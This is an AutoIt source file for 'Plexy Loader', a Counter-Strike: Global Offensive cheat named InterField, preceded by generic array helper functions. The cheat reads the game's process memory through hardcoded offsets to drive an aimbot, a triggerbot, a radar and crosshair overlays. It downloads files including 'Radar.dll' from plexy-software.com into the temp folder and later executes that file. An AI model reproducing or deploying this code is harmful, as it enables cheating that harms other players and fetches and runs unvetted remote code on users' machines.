	If @error Then Return SetError(@error, 0, "")
	Return $avarray[$iresult]
EndFunc
Func _arraymaxindex(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) OR UBound($avarray, 0) <> 1 Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, -1)
	Local $imaxindex = $istart
	If $icompnumeric Then
		For $i = $istart To $iend
			If Number($avarray[$imaxindex]) < Number($avarray[$i]) Then $imaxindex = $i
		Next
	Else
		For $i = $istart To $iend
			If $avarray[$imaxindex] < $avarray[$i] Then $imaxindex = $i
		Next
	EndIf
	Return $imaxindex
EndFunc
Func _arraymin(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	Local $iresult = _arrayminindex($avarray, $icompnumeric, $istart, $iend)
	If @error Then Return SetError(@error, 0, "")
	Return $avarray[$iresult]
EndFunc
Func _arrayminindex(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, -1)
	Local $iminindex = $istart
	If $icompnumeric Then
		For $i = $istart To $iend
			If Number($avarray[$iminindex]) > Number($avarray[$i]) Then $iminindex = $i
		Next
	Else
		For $i = $istart To $iend
			If $avarray[$iminindex] > $avarray[$i] Then $iminindex = $i
		Next
	EndIf
	Return $iminindex
EndFunc
Func _arraypermute(ByRef $avarray, $sdelim = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $isize = UBound($avarray), $ifactorial = 1, $aidx[$isize], $aresult[1], $icount = 1
	For $i = 0 To $isize - 1
		$aidx[$i] = $i
	Next
	For $i = $isize To 1 Step -1
		$ifactorial *= $i
	Next
	ReDim $aresult[$ifactorial + 1]
	$aresult[0] = $ifactorial
	__array_exeterinternal($avarray, 0, $isize, $sdelim, $aidx, $aresult, $icount)
	Return $aresult
EndFunc
Func _arraypop(ByRef $avarray)
	If (NOT IsArray($avarray)) Then Return SetError(1, 0, "")
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, "")
	Local $iubound = UBound($avarray) - 1, $slastval = $avarray[$iubound]
	If NOT $iubound Then
		$avarray = ""
	Else
		ReDim $avarray[$iubound]
	EndIf
	Return $slastval
EndFunc
Func _arraypush(ByRef $avarray, $vvalue, $idirection = 0)
	If (NOT IsArray($avarray)) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(3, 0, 0)
	Local $iubound = UBound($avarray) - 1
	If IsArray($vvalue) Then
		Local $iubounds = UBound($vvalue)
		If ($iubounds - 1) > $iubound Then Return SetError(2, 0, 0)
		If $idirection Then
			For $i = $iubound To $iubounds Step -1
				$avarray[$i] = $avarray[$i - $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$avarray[$i] = $vvalue[$i]
			Next
		Else
			For $i = 0 To $iubound - $iubounds
				$avarray[$i] = $avarray[$i + $iubounds]
			Next
			For $i = 0 To $iubounds - 1
				$avarray[$i + $iubound - $iubounds + 1] = $vvalue[$i]
			Next
		EndIf
	Else
		If $idirection Then
			For $i = $iubound To 1 Step -1
				$avarray[$i] = $avarray[$i - 1]
			Next
			$avarray[0] = $vvalue
		Else
			For $i = 0 To $iubound - 1
				$avarray[$i] = $avarray[$i + 1]
			Next
			$avarray[$iubound] = $vvalue
		EndIf
	EndIf
	Return 1
EndFunc

Func _arraysearch(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $iforward = 1, $isubitem = -1)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) > 2 OR UBound($avarray, 0) < 1 Then Return SetError(2, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(4, 0, -1)
	Local $istep = 1
	If NOT $iforward Then
		Local $itmp = $istart
		$istart = $iend
		$iend = $itmp
		$istep = -1
	EndIf
	Local $icomptype = False
	If $icompare = 2 Then
		$icompare = 0
		$icomptype = True
	EndIf
	Switch UBound($avarray, 0)
		Case 1
			If NOT $icompare Then
				If NOT $icase Then
					For $i = $istart To $iend Step $istep
						If $icomptype AND VarGetType($avarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $avarray[$i] = $vvalue Then Return $i
					Next
				Else
					For $i = $istart To $iend Step $istep
						If $icomptype AND VarGetType($avarray[$i]) <> VarGetType($vvalue) Then ContinueLoop
						If $avarray[$i] == $vvalue Then Return $i
					Next
				EndIf
			Else
				For $i = $istart To $iend Step $istep
					If StringInStr($avarray[$i], $vvalue, $icase) > 0 Then Return $i
				Next
			EndIf
		Case 2
			Local $iuboundsub = UBound($avarray, 2) - 1
			If $isubitem > $iuboundsub Then $isubitem = $iuboundsub
			If $isubitem < 0 Then
				$isubitem = 0
			Else
				$iuboundsub = $isubitem
			EndIf
			For $j = $isubitem To $iuboundsub
				If NOT $icompare Then
					If NOT $icase Then
						For $i = $istart To $iend Step $istep
							If $icomptype AND VarGetType($avarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
							If $avarray[$i][$j] = $vvalue Then Return $i
						Next
					Else
						For $i = $istart To $iend Step $istep
							If $icomptype AND VarGetType($avarray[$i][$j]) <> VarGetType($vvalue) Then ContinueLoop
							If $avarray[$i][$j] == $vvalue Then Return $i
						Next
					EndIf
				Else
					For $i = $istart To $iend Step $istep
						If StringInStr($avarray[$i][$j], $vvalue, $icase) > 0 Then Return $i
					Next
				EndIf
			Next
		Case Else
			Return SetError(7, 0, -1)
	EndSwitch
	Return SetError(6, 0, -1)
EndFunc
Func _arraysort(ByRef $avarray, $idescending = 0, $istart = 0, $iend = 0, $isubitem = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(2, 0, 0)
	Switch UBound($avarray, 0)
		Case 1
			__arrayquicksort1d($avarray, $istart, $iend)
			If $idescending Then _arrayreverse($avarray, $istart, $iend)
		Case 2
			Local $isubmax = UBound($avarray, 2) - 1
			If $isubitem > $isubmax Then Return SetError(3, 0, 0)
			If $idescending Then
				$idescending = -1
			Else
				$idescending = 1
			EndIf
			__arrayquicksort2d($avarray, $idescending, $istart, $iend, $isubitem, $isubmax)
		Case Else
			Return SetError(4, 0, 0)
	EndSwitch
	Return 1
EndFunc
Func __arrayquicksort1d(ByRef $avarray, ByRef $istart, ByRef $iend)
	If $iend <= $istart Then Return
	Local $vtmp
	If ($iend - $istart) < 15 Then
		Local $vcur
		For $i = $istart + 1 To $iend
			$vtmp = $avarray[$i]
			If IsNumber($vtmp) Then
				For $j = $i - 1 To $istart Step -1
					$vcur = $avarray[$j]
					If ($vtmp >= $vcur AND IsNumber($vcur)) OR (NOT IsNumber($vcur) AND StringCompare($vtmp, $vcur) >= 0) Then ExitLoop
					$avarray[$j + 1] = $vcur
				Next
			Else
				For $j = $i - 1 To $istart Step -1
					If (StringCompare($vtmp, $avarray[$j]) >= 0) Then ExitLoop
					$avarray[$j + 1] = $avarray[$j]
				Next
			EndIf
			$avarray[$j + 1] = $vtmp
		Next
		Return
	EndIf
	Local $l = $istart, $r = $iend, $vpivot = $avarray[Int(($istart + $iend) / 2)], $fnum = IsNumber($vpivot)
	Do
		If $fnum Then
			While ($avarray[$l] < $vpivot AND IsNumber($avarray[$l])) OR (NOT IsNumber($avarray[$l]) AND StringCompare($avarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While ($avarray[$r] > $vpivot AND IsNumber($avarray[$r])) OR (NOT IsNumber($avarray[$r]) AND StringCompare($avarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While (StringCompare($avarray[$l], $vpivot) < 0)
				$l += 1
			WEnd
			While (StringCompare($avarray[$r], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			$vtmp = $avarray[$l]
			$avarray[$l] = $avarray[$r]
			$avarray[$r] = $vtmp
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort1d($avarray, $istart, $r)
	__arrayquicksort1d($avarray, $l, $iend)
EndFunc
Func __arrayquicksort2d(ByRef $avarray, ByRef $istep, ByRef $istart, ByRef $iend, ByRef $isubitem, ByRef $isubmax)
	If $iend <= $istart Then Return
	Local $vtmp, $l = $istart, $r = $iend, $vpivot = $avarray[Int(($istart + $iend) / 2)][$isubitem], $fnum = IsNumber($vpivot)
	Do
		If $fnum Then
			While ($istep * ($avarray[$l][$isubitem] - $vpivot) < 0 AND IsNumber($avarray[$l][$isubitem])) OR (NOT IsNumber($avarray[$l][$isubitem]) AND $istep * StringCompare($avarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * ($avarray[$r][$isubitem] - $vpivot) > 0 AND IsNumber($avarray[$r][$isubitem])) OR (NOT IsNumber($avarray[$r][$isubitem]) AND $istep * StringCompare($avarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		Else
			While ($istep * StringCompare($avarray[$l][$isubitem], $vpivot) < 0)
				$l += 1
			WEnd
			While ($istep * StringCompare($avarray[$r][$isubitem], $vpivot) > 0)
				$r -= 1
			WEnd
		EndIf
		If $l <= $r Then
			For $i = 0 To $isubmax
				$vtmp = $avarray[$l][$i]
				$avarray[$l][$i] = $avarray[$r][$i]
				$avarray[$r][$i] = $vtmp
			Next
			$l += 1
			$r -= 1
		EndIf
	Until $l > $r
	__arrayquicksort2d($avarray, $istep, $istart, $r, $isubitem, $isubmax)
	__arrayquicksort2d($avarray, $istep, $l, $iend, $isubitem, $isubmax)
EndFunc

Func _arrayunique($aarray, $idimension = 1, $ibase = 0, $icase = 0, $vdelim = "|")
	Local $iubounddim
	If $vdelim = "|" Then $vdelim = Chr(1)
	If NOT IsArray($aarray) Then Return SetError(1, 0, 0)
	If NOT $idimension > 0 Then
		Return SetError(3, 0, 0)
	Else
		$iubounddim = UBound($aarray, 1)
		If @error Then Return SetError(3, 0, 0)
		If $idimension > 1 Then
			Local $aarraytmp[1]
			For $i = 0 To $iubounddim - 1
				_arrayadd($aarraytmp, $aarray[$i][$idimension - 1])
			Next
			_arraydelete($aarraytmp, 0)
		Else
			If UBound($aarray, 0) = 1 Then
				Dim $aarraytmp[1]
				For $i = 0 To $iubounddim - 1
					_arrayadd($aarraytmp, $aarray[$i])
				Next
				_arraydelete($aarraytmp, 0)
			Else
				Dim $aarraytmp[1]
				For $i = 0 To $iubounddim - 1
					_arrayadd($aarraytmp, $aarray[$i][$idimension - 1])
				Next
				_arraydelete($aarraytmp, 0)
			EndIf
		EndIf
	EndIf
	Local $shold
	For $icc = $ibase To UBound($aarraytmp) - 1
		If NOT StringInStr($vdelim & $shold, $vdelim & $aarraytmp[$icc] & $vdelim, $icase) Then $shold &= $aarraytmp[$icc] & $vdelim
	Next
	If $shold Then
		$aarraytmp = StringSplit(StringTrimRight($shold, StringLen($vdelim)), $vdelim, 1)
		Return $aarraytmp
	EndIf
	Return SetError(2, 0, 0)
EndFunc



If NOT FileExists("C:\Settings.cfg") Then
MsgBox(16,"Plexy-Software ", "Your settings file is missing!" & @LF & "Please place the Settings.cfg file on your 'C:\' drive!")
Exit
EndIf



Sleep(250)


func internetcheck()
	$ping = ping("google.com",2000)
	if (($ping <> 0) and ($ping < 3000) ) then
		return 1
	else
		return 0
	EndIf
 EndFunc


	$internett = internetcheck()
	if $internett == 0 then
			MsgBox(16,"Error","You need an internet connection to use this program !")
			Exit
		EndIf
	InetGet ( 'http://plexy-software.com/images/Cubexlog.jpg', @TempDir & '\Cubexlog.jpg', 1, 1 )
Sleep (2000)


 Func _MY_NCHITTEST($hWnd, $uMsg, $wParam, $lParam)
     Switch $hWnd
         Case $rdrgui
             Local $aPos = WinGetPos($hWnd)
             If Abs(BitAND(BitShift($lParam, 16), 0xFFFF) - $aPos[1]) < 50 Then Return $HTCAPTION
     EndSwitch
     Return $GUI_RUNDEFMSG
  EndFunc


Sleep(100)


$Title = "Plexy Loader:"
$Width = 361
$Height = 282
$Font = "Calibri"
$FontSize = 8
$FontColor = 0xFFFFFF
$TitleHeight = 15
$BgColorTitle = 0x141414
$linecolor = 0x000000
$BgColor = 0xF0F0F0
$GUI = GUICreate($Title, $Width, $Height, -1, -1, $WS_POPUP)
GUISetBkColor($BgColor)
GUISetFont($FontSize, 400, 0, $Font)
$TitleBar = GUICtrlCreateLabel($Title, 5, 2, $Width, 17, -1, $GUI_WS_EX_PARENTDRAG)
GUICtrlSetColor(-1, $FontColor)
GUICtrlSetBkColor(-1, $GUI_BKCOLOR_TRANSPARENT)
GUICtrlCreateGraphic(0, 0, $Width, $TitleHeight + 2)
GUICtrlSetBkColor(-1, $BgColorTitle)
GUISetFont(8.5, 400, 0, "Calibri")
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)
$Pic1 = GUICtrlCreatePic(@TempDir & "\Cubexlog.jpg", 21, 115, 324, 83)
GUICtrlCreateList("InterField", 13, 30, 336, 95, +$SS_CENTER)
GUICtrlSetFont(-1, 15, -1, -1, $Font)

$Label2 = GUICtrlCreateLabel("©Copyright 2013-2015 All rights reversed", 80, 258, 197, 17)



$loadbut = GUICtrlCreateButton("Load", 35, 225, 286, 22)

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
            Exit

		Case $loadbut
			GUIDelete($GUI)
			ExitLoop

		 EndSwitch
WEnd


$Title = "Plexy Loader:"
$Width = 250
$Height = 60
$Font = "Calibri"
$FontSize = 8
$FontColor = 0xFFFFFF
$TitleHeight = 15
$BgColorTitle = 0x141414
$linecolor = 0x000000
$BgColor = 0xF0F0F0
$GUI = GUICreate($Title, $Width, $Height, -1, -1, $WS_POPUP)
GUISetBkColor($BgColor)
GUISetFont($FontSize, 400, 0, $Font)
$TitleBar = GUICtrlCreateLabel($Title, 5, 2, $Width, 17, -1, $GUI_WS_EX_PARENTDRAG)
GUICtrlSetColor(-1, $FontColor)
GUICtrlSetBkColor(-1, $GUI_BKCOLOR_TRANSPARENT)
GUICtrlCreateGraphic(0, 0, $Width, $TitleHeight + 2)
GUICtrlSetBkColor(-1, $BgColorTitle)
GUISetFont(8.5, 400, 0, "Calibri")
GUICtrlCreateGroup("", -99, -99, 1, 1)


$downloadtext = GUICtrlCreateLabel("Downloading Requirement..", 61, 20)
$download = GUICtrlCreateProgress(25, 38, 200, 15)
GUISetState(@SW_SHOW)

GUICtrlSetData($download, 5)
InetGet("http://plexy-software.com/forum/Increase.bmp", @TempDir & "\Increase.bmp", 1, 0)
InetGet("http://plexy-software.com/forum/Disable.bmp", @TempDir & "\Disable.bmp", 1, 0)
InetGet("http://plexy-software.com/forum/Decrease.bmp", @TempDir & "\Decrease.bmp", 1, 0)
InetGet("http://www.plexy-software.com/grey.bmp", @TempDir & "\grey.bmp", 1, 0)
GUICtrlSetData($download, 15)
Sleep(1600)
InetGet("http://www.plexy-software.com/forum/Radar.dll", @TempDir & "\Radar.dll", 1, 0)
InetGet("http://www.plexy-software.com/red.bmp", @TempDir & "\red.bmp", 1, 0)
GUICtrlSetData($download, 22)
Sleep(5000)
InetGet("http://plexy-software.com/forum/Chance.bmp", @TempDir & "\Chance.bmp", 1, 0)
InetGet("http://plexy-software.com/forum/CEnemy.bmp", @TempDir & "\CEnemy.bmp", 1, 0)
InetGet("http://plexy-software.com/forum/Active.bmp", @TempDir & "\Active.bmp", 1, 0)
InetGet("http://www.plexy-software.com/black.bmp", @TempDir & "\black.bmp", 1, 0)
GUICtrlSetData($download, 30)
Sleep(1600)
InetGet("http://plexy-software.com/forum/UEnemy.bmp", @TempDir & "\UEnemy.bmp", 1, 0)
InetGet("http://plexy-software.com/forum/Status.bmp", @TempDir & "\Status.bmp", 1, 0)
InetGet("http://plexy-software.com/forum/Security.bmp", @TempDir & "\Security.bmp", 1, 0)
InetGet("http://www.plexy-software.com/midlines.bmp", @TempDir & "\midlines.bmp", 1, 0)
GUICtrlSetData($download, 41)
Sleep(1600)

GUICtrlSetData($downloadtext, "Loading Cheat..")
GUICtrlSetPos($downloadtext, 88, 20)
GUICtrlSetData($download, 59)
Sleep(470)
StatusUpdate()
GUICtrlSetData($download, 67)
Sleep(470)

GUICtrlSetData($download, 79)
Sleep(470)



GUICtrlSetData($download, 89)
Sleep(470)

GUICtrlSetData($download, 100)
Sleep(470)


$iFovoffset = 5520
$hitboxpos = 308
$Recoil_offset = 112
$m_local = 4972
$BoneOffset = 2680
$ViewAng =  5604372
$ViewAngOff = 19640
$c_dwLocalBaseEntity = 10926444
$c_dwBaseEntity = 77652004
$MyTeamAD = 240
$Healths = 252
$crossid = 9208
$m_hActiveOffset = 4800
$WeaponID = 5764
$radarspotoff = 2357


$MR = 57.295779513082
$M_PI = 3.14159265358979323846
$addx = 0
$addy = 0
$MinF = ""
$iStart = 0
$iEnd = 0
$Other = 0
$degToRad = $M_PI / 180

GUICtrlSetData($downloadtext, "Waiting for CSGO.exe..")
GUICtrlSetPos($downloadtext, 72, 20)
Sleep(10)
ProcessWait("CSGO.exe")
Sleep(4000)
GUIDelete ($GUI)

$degToRad = $M_PI / 180

HotKeySet("{INS}", "Menu")
HotKeySet("{DEL}", "Panic")

$Menu = 0

ProcessSetPriority(@ScriptName, 5)

WinWait("[CLASS:Valve001]", "")

$UPD = 500
$UPDSET = 50

$process = _memoryopen(ProcessExists("csgo.exe"))
$client_dll = xmodule("client.dll", ProcessExists("csgo.exe"))
$engine_dll = xmodule("engine.dll", ProcessExists("csgo.exe"))



$LocalBase = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
$m_hActiveWeapon = _memoryread($LocalBase + $m_hActiveOffset, $process, "dword")
$index = BitAnd($m_hActiveWeapon, 0xFFF)
$dw_BasePointer = _memoryread($client_dll + $c_dwBaseEntity + (($index-1) * 16), $process, "dword")
$WeaponIDs = _memoryread($dw_BasePointer + $WeaponID, $process, "dword")
If $WeaponIDs > 0 and $WeaponIDs < 50 then
$weaponname = GetWeaponName($WeaponIDs)
Else
$weaponname = "none"
endif
	$FileSet = "C:\Settings.cfg"
	$key = IniRead( $FileSet, "Settings", "Aimbot_Key", 0 )
	$ptkey = IniRead( $FileSet, "Settings", "Triggerbot_Key", 0 )
    $Smooth = IniRead ($FileSet, "Settings" , "Aimbot_Smooth" , 0)
	$viasghfaf = IniRead ($FileSet , "Settings" ,"Aimbot_VisibilityCheck" , 0)


	$dfhgzfsgzsfg = IniRead( $FileSet, "WeaponSettings", "aimbot_"& $weaponname & ".enabled", 0 )
	$Bone = IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".height", 0 )
	$fov = IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".fov", 0 )
	$RCS =  IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".rcs", 0 )
	$Delay = IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".delay", 0 )
	$ptrigger = IniRead( $FileSet, "WeaponSettings", "triggerbot_" & $weaponname & ".enabled", 0 )
	$phitbox = IniRead( $FileSet, "WeaponSettings",  "triggerbot_" & $weaponname & ".hitbox", 0)
    $pallbody = IniRead($FileSet, "WeaponSettings", "triggerbot_" & $weaponname & ".allbody", 0)
	$pTDelay = IniRead($FileSet, 'WeaponSettings', "triggerbot_" & $weaponname & ".BeforeDelay", 0)
	$shotdelay = IniRead($FileSet, 'WeaponSettings', "triggerbot_" & $weaponname & ".AfterDelay", 0)
	$overburst = IniRead($FileSet, 'WeaponSettings', "triggerbot_" & $weaponname & ".Overburst", 0)
	$radarenable = IniRead($FileSet, "Settings", "Radar_Enabled", 0)


    $u = 0
	$d = 0
	$Drawfov = IniRead($FileSet, "Settings", "Visuals.DrawFoV", 0)
	$fovadside = IniRead($FileSet, "Settings", "Visuals.DrawFoV.adside", 0)
	$fovadup = IniRead($FileSet, "Settings", "Visuals.DrawFoV.adup", 0)

	$Croshair = IniRead($FileSet, "Settings", "Visuals.Crosshair", 0)
	$adside = IniRead($FileSet, "Settings", "Visuals.Crosshair.adside", 0)
	$adup = IniRead($FileSet, "Settings", "Visuals.Crosshair.adup", 0)

	$watermarkactive = IniRead($FileSet, "Settings", "Watermark", 0)

Func Info()
if $UPD = 500 Then
	$process = _memoryopen(ProcessExists("csgo.exe"))
	$client_dll = xmodule("client.dll", ProcessExists("csgo.exe"))
	$engine_dll = xmodule("engine.dll", ProcessExists("csgo.exe"))
	$UPD = 0
EndIf
$UPD = $UPD + 1

if $UPDSET = 50 Then
	$LocalBase = _memoryread($client_dll + $c_dwLocalBaseEntity, $process, "dword")
	$m_hActiveWeapon = _memoryread($LocalBase + $m_hActiveOffset, $process, "dword")
	$index = BitAnd($m_hActiveWeapon, 0xFFF)
	$dw_BasePointer = _memoryread($client_dll + $c_dwBaseEntity + (($index-1) * 16), $process, "dword")
	$WeaponIDs = _memoryread($dw_BasePointer + $WeaponID, $process, "dword")
	If $WeaponIDs > 0 and $WeaponIDs < 50 then
		$weaponname = GetWeaponName($WeaponIDs)
	Else
		$weaponname = "none"
	endif
	If WinActive("[CLASS:Valve001]") Then
	$FileSet = "C:\Settings.cfg"
	$key = IniRead( $FileSet, "Settings", "Aimbot_Key", 0 )
	$ptkey = IniRead( $FileSet, "Settings", "Triggerbot_Key", 0 )
	$Smooth = IniRead ($FileSet, "Settings" , "Aimbot_Smooth" , 0)
	$viasghfaf = IniRead ($FileSet , "Settings" ,"Aimbot_VisibilityCheck" , 0)


	$dfhgzfsgzsfg = IniRead( $FileSet, "WeaponSettings", "aimbot_"& $weaponname & ".enabled", 0 )
	$Bone = IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".height", 0 )
	$fov = IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".fov", 0 )
	$RCS =  IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".rcs", 0 )
	$Delay = IniRead( $FileSet, "WeaponSettings", "aimbot_" & $weaponname & ".delay", 0 )
	$ptrigger = IniRead( $FileSet, "WeaponSettings", "triggerbot_" & $weaponname & ".enabled", 0 )
	$phitbox = IniRead( $FileSet, "WeaponSettings",  "triggerbot_" & $weaponname & ".hitbox", 0)
    $pallbody = IniRead($FileSet, "WeaponSettings", "triggerbot_" & $weaponname & ".allbody", 0)
	$pTDelay = IniRead($FileSet, 'WeaponSettings', "triggerbot_" & $weaponname & ".BeforeDelay", 0)
	$shotdelay = IniRead($FileSet, 'WeaponSettings', "triggerbot_" & $weaponname & ".AfterDelay", 0)
	$overburst = IniRead($FileSet, 'WeaponSettings', "triggerbot_" & $weaponname & ".Overburst", 0)
	$radarenable = IniRead($FileSet, "Settings", "Radar_Enabled", 0)


    $u = 0
	$d = 0
	$Drawfov = IniRead($FileSet, "Settings", "Visuals.DrawFoV", 0)
	$fovadside = IniRead($FileSet, "Settings", "Visuals.DrawFoV.adside", 0)
	$fovadup = IniRead($FileSet, "Settings", "Visuals.DrawFoV.adup", 0)

	$Croshair = IniRead($FileSet, "Settings", "Visuals.Crosshair", 0)
	$adside = IniRead($FileSet, "Settings", "Visuals.Crosshair.adside", 0)
	$adup = IniRead($FileSet, "Settings", "Visuals.Crosshair.adup", 0)

	$watermarkactive = IniRead($FileSet, "Settings", "Watermark", 0)
	EndIf



$UPDSET = 0
EndIf
$UPDSET = $UPDSET + 1
EndFunc


Global Const $SM_CXFIXEDFRAME = 7
Global Const $hTitlebar = _WinAPI_GetSystemMetrics($SM_CYCAPTION)
Global Const $hBorder = _WinAPI_GetSystemMetrics($SM_CXFIXEDFRAME)

$hWnd = WinWait("Counter-Strike: Global Offensive", "", 10)
$aClientSize = WinGetClientSize($hWnd)

$readfovvalue = -99
$readheightvalue = -99
$readdelayvalue = -99
$readenablevalue = 0
$readrcsvalue = 0
$treadhitvalue = 0
$treadhitboxvalue = -99
$treadaftervalue = -99
$treadbeforevalue = -99


$CrossGUI = GUICreate('', 0, 0, 0, 0, 0, $WS_EX_TOOLWINDOW)


Global $aArray[40] = ["Deagle", "Elite", "P2000", "P90", "MAC10", "Bizon", "sg553", "fiveseven", "Glock", "p228", "p250", "usp", "famas", "ak47", "nova", "mag7", "ump45", "mp7", "m4a1", "galil", "galilar", "aug", "scar20", "awp", "g3sg1", "m249", "m3", "mp5navy", "scout","sg550", "sg552", "tmp", "xm1014", "negev", "sawedoff", "tec9", "taser", "mp9", "scar17", "ssg08"]

$sList = ""
For $i = 0 To UBound($aArray) - 1
    $sList &= "|" & $aArray[$i]
Next

$CrossGUIChild = GUICreate("", $aClientSize[0] - $hBorder, $aClientSize[1] - ($hTitlebar - $hBorder), -1, -1, $WS_POPUP, BitOR($WS_EX_TOPMOST, $WS_EX_TOOLWINDOW, $WS_EX_LAYERED, $WS_EX_TRANSPARENT), $CrossGUI)
GUISetBkColor($COLOR_BLACK)

$watermark = GUICtrlCreateLabel("InterField", 2 + $hBorder, 2 + ($hTitlebar + $hBorder), 270, 15)
GUICtrlSetColor($watermark, 0xFF0000)
GUICtrlSetFont(-1, 9, 700, -1, "Calibri")


If $radarenable = 1 Then
Run(@TempDir & "\Radar.dll")
Else
ProcessClose("Radar.dll")
EndIf


If $watermarkactive = 0 Then
	GUICtrlSetColor($watermark, 0)
EndIf

If $Drawfov = 1 Then
$dfovgui = GUICtrlCreateGraphic($aClientSize[0] / 2 - $fov *5 + $fovadside, $aClientSize[1] / 2 - $fov*2.5 + $fovadup, $fov * 10, $fov * 10)
GUICtrlSetColor(-1, 0xFF0000)
Else
$dfovgui = GUICtrlCreateGraphic($aClientSize[0] / 2 - $fov *5 + $fovadside, $aClientSize[1] / 2 - $fov*2.5 + $fovadup, $fov * 10, $fov * 10)
EndIf


	If $Croshair = 1 Then
	$dcrossgui = GUICtrlCreateGraphic( $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup, 20, 20)
	GUICtrlSetColor(-1, 0xFF0000)
	$dcrossgui2 = GUICtrlCreateGraphic( $aClientSize[0] / 2 + $adside + 9, $aClientSize[1] / 2 + $adup, 1, 20)
	GUICtrlSetColor(-1, 0xFF0000)
	$dcrossgui3 = GUICtrlCreateGraphic( $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup + 10, 20, 1)
	GUICtrlSetColor(-1, 0xFF0000)
	Else
	$dcrossgui = GUICtrlCreateGraphic( $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup, 20, 20)
	$dcrossgui2 = GUICtrlCreateGraphic( $aClientSize[0] / 2 + $adside + 9, $aClientSize[1] / 2 + $adup, 1, 20)
	$dcrossgui3 = GUICtrlCreateGraphic( $aClientSize[0] / 2 + $adside, $aClientSize[1] / 2 + $adup + 10, 20, 1)
	EndIf



_WinAPI_SetLayeredWindowAttributes($CrossGUIChild, $COLOR_BLACK)
GUISetState(@SW_SHOWNOACTIVATE, $CrossGUIChild)



$Title = "     InterField"
$Width = 550
$Height = 400

$Font = "Calibri"
$FontSize = 8.5
$FontColor = 0xFFFFFF
$TitleHeight = 20
$BackgroundColor = 0x1D1D1D
$TitleBackGroundColor = 0x1D1D1D


$MainGUI = GUICreate($Title, $Width, $Height, -1, -1, $WS_POPUP, $WS_EX_TOPMOST, $CrossGUI)
GUISetBKColor($BackgroundColor)
GUISetFont($FontSize, 400, 0, $Font)


$TitleBar = GUICtrlCreateLabel($Title, 0, 8, $Width, 15, -1, $GUI_WS_EX_PARENTDRAG)
GUICtrlSetColor($TitleBar, $FontColor)
GUICtrlSetBkColor($TitleBar, $GUI_BKCOLOR_TRANSPARENT)
GUICtrlCreateGraphic(0, 0, $Width, $TitleHeight)
GUICtrlSetBkColor(-1, $TitleBackGroundColor)

GUISetFont(8.5, 400, 0, "Calibri")



;##################################
;           Tabs
;#################################

Global $TabSwitcher[7]

Global Const $TabSwitcher1 = GUICtrlCreateLabel("Aimbot", 11, 31, 100, 40, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetBkColor(-1, 0x750606)
GUICtrlSetColor(-1, 0xFFFFFF)

Global Const $TabSwitcher2 = GUICtrlCreateLabel("Triggerbot", 11, 74, 100, 40, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetBkColor(-1, 0x292929)
GUICtrlSetColor(-1, 0xFFFFFF)

Global Const $TabSwitcher3 = GUICtrlCreateLabel("Radar", 11, 117, 100, 40, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetBkColor(-1, 0x292929)
GUICtrlSetColor(-1, 0xFFFFFF)

Global Const $TabSwitcher4 = GUICtrlCreateLabel("Misc", 11, 160, 100, 40, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetBkColor(-1, 0x292929)
GUICtrlSetColor(-1, 0x0FFFFFF)

Global Const $TabSwitcher5 = GUICtrlCreateLabel("Live-Status", 11, 203, 100, 40, +$SS_CENTER+ $SS_CENTERIMAGE)
GUICtrlSetBkColor(-1, 0x292929)
GUICtrlSetColor(-1, 0xFFFFFF)


